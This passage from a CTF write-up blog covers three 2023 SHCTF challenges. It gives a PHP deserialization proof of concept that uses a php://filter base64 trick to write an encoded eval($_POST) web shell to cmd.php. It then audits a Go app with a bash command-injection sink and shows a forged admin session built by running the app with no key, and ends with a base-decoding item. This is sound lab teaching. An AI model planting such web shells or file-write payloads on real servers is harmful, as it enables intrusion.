<p>根据上述理论我们看一下<code>&lt;?php die("+Genshin Impact Start!+");?&gt;</code>在经过base64解码的时候会将<code>&lt;、?、;、(、)</code>忽略，也就是说最后只剩下<code>phpdie+GenshinImpactStart+</code>共26个字符，考虑到base64特性我们需要增添两个字符使其为4的倍数也就是28，最终payload如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;<br>}<br><br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$poc</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$poc</span>-&gt;barking-&gt;part1 = <span class="hljs-string">'php://filter/write=convert.base64-decode/resource=cmd.php'</span>;<br><span class="hljs-variable">$poc</span>-&gt;barking-&gt;part2 = <span class="hljs-string">'aaPD9waHAgQGV2YWwoJF9QT1NUWydoeWJjeCddKTs/Pg=='</span>; <span class="hljs-comment">//注意这里前面有两个字符aa</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231031202036768.png" alt="image-20231031202036768"></p>
<p>上传访问即可</p>
<p><img src="image-20231031202111335.png" alt="image-20231031202111335"></p>
<p>拿到flag</p>
<p>另外的各种姿势还可参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contents利用技巧(php://filter协议)</a></p>
<h3 id="WEEK3-gogogo">[WEEK3]gogogo</h3>
<p>这道题根据附件来看是一道go语言审计题目，这也是第一次遇见。。。先自己审计一波</p>
<p>main.go</p>
<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">"main/route"</span><br><br>	<span class="hljs-string">"github.com/gin-gonic/gin"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>	r := gin.Default()<br>	r.GET(<span class="hljs-string">"/"</span>, route.Index)<br>	r.GET(<span class="hljs-string">"/readflag"</span>, route.Readflag)<br>	r.Run(<span class="hljs-string">"0.0.0.0:8000"</span>)<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>route.go</p>
<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">"github.com/gin-gonic/gin"</span><br>	<span class="hljs-string">"github.com/gorilla/sessions"</span><br>	<span class="hljs-string">"main/readfile"</span><br>	<span class="hljs-string">"net/http"</span><br>	<span class="hljs-string">"os"</span><br>	<span class="hljs-string">"regexp"</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">"SESSION_KEY"</span>)))<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> {<br>	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	}<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-literal">nil</span> {<br>		session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"User"</span><br>		err = session.Save(c.Request, c.Writer)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		}<br>	}<br><br>	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Hello, User. How to become admin?"</span>)<br><br>}<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Readflag</span><span class="hljs-params">(c *gin.Context)</span></span> {<br>	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	}<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-string">"admin"</span> {<br>		c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Congratulation! You are admin,But how to get flag?\n"</span>)<br><br>		path := c.Query(<span class="hljs-string">"filename"</span>)<br><br>		reg := regexp.MustCompile(<span class="hljs-string">`[b-zA-Z_@#%^&amp;*:{|}+&lt;&gt;";\[\]]`</span>)<br><br>		<span class="hljs-keyword">if</span> reg.MatchString(path) {<br><br>			http.Error(c.Writer, <span class="hljs-string">"nonono"</span>, http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		}<br><br>		<span class="hljs-keyword">var</span> data []<span class="hljs-type">byte</span><br>		<span class="hljs-keyword">if</span> path != <span class="hljs-string">""</span> {<br>			data = readfile.ReadFile(path)<br>		} <span class="hljs-keyword">else</span> {<br>			data = []<span class="hljs-type">byte</span>(<span class="hljs-string">"请传入参数"</span>)<br>		}<br><br>		c.JSON(<span class="hljs-number">200</span>, gin.H{<br>			<span class="hljs-string">"success"</span>: <span class="hljs-string">"read: "</span> + <span class="hljs-type">string</span>(data),<br>		})<br>	} <span class="hljs-keyword">else</span> {<br>		c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Hello, User. How to become admin?"</span>)<br>	}<br><br>}<br></code></pre></td></tr></tbody></table></figure>
<p>readfile.go</p>
<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> readfile<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">"os/exec"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadFile</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> (string2 []<span class="hljs-type">byte</span>) {<br>	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {<br>		panic_err := <span class="hljs-built_in">recover</span>()<br>		<span class="hljs-keyword">if</span> panic_err != <span class="hljs-literal">nil</span> {<br><br>		}<br>	}()<br>	cmd := exec.Command(<span class="hljs-string">"bash"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"strings  "</span>+path)<br>	string2, err := cmd.Output()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>		string2 = []<span class="hljs-type">byte</span>(<span class="hljs-string">"文件不存在"</span>)<br>	}<br>	<span class="hljs-keyword">return</span> string2<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>看了一波感觉是session伪构造，其中要求我们的name为admin才能有读取flag的权限，但是session.name是加密过的：</p>
<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">"SESSION_KEY"</span>)))<br></code></pre></td></tr></tbody></table></figure>
<p>这里看到是以session_key密钥加密，这时候神奇的思路就来了，佬们都直接盲猜题目没有该环境变量，于是想着直接搭建到本地运行得到session，在此之前我们看一下这个</p>
<p><img src="image-20231031212206314.png" alt="image-20231031212206314"></p>
<p>可以看到我们当前的name为User根据上述index处的代码我们知道当name=nil的时候，才会赋值为User，这说明在此之前我们的name一定是nil，此时如果我们修改这个代码</p>
<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"User"</span><br>改为<br>session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"admin"</span><br></code></pre></td></tr></tbody></table></figure>
<p>那此时运行完之后我们的session.name一定是admin，思路打通了，那直接本地搭建即可</p>
<p>这里也是搭建了很长时间，一直报错。。。但功夫不负有心人还是搭建好了</p>
<p><img src="image-20231031223645605.png" alt="image-20231031223645605"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg==<br><br>MTY5ODc1NDk2OHxEdi1CQkFFQ180SUFBUkFCRUFBQUl2LUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBWUFCRlZ6WlhJPXzzzlJr4E_S8XnoBRbpogEHKAVkSrz_YsNvqNpca0wA6g==<br><br>MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg==<br></code></pre></td></tr></tbody></table></figure>
<p>我们访问127.0.0.1:8000得到session，如上所示，最后看一下readfile函数</p>
<p><img src="image-20231031224029185.png" alt="image-20231031224029185"></p>
<p>这里看了wp发现filename是get传参，然后是一个正则过滤</p>
<h2 id="MISC">MISC</h2>
<h3 id="签到题">签到题</h3>
<p>发现是base128，两次base64解码即可</p>
<p><img src="image-20231118225505778.png" alt="image-20231118225505778"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2023/10/02/2023shctf/">http://hybcx.xyz/2023/10/02/2023shctf/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                                    <span class="chip bg-color">CTF赛事</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/10/03/zhuanxv/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Zhuanxv">
                        
                        <span class="card-title">Zhuanxv</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-03
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
                                    攻防世界
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/10/01/i-got-id-200/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="i-got-id-200">
                        
                        <span class="card-title">i-got-id-200</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-01
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
                                    攻防世界
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
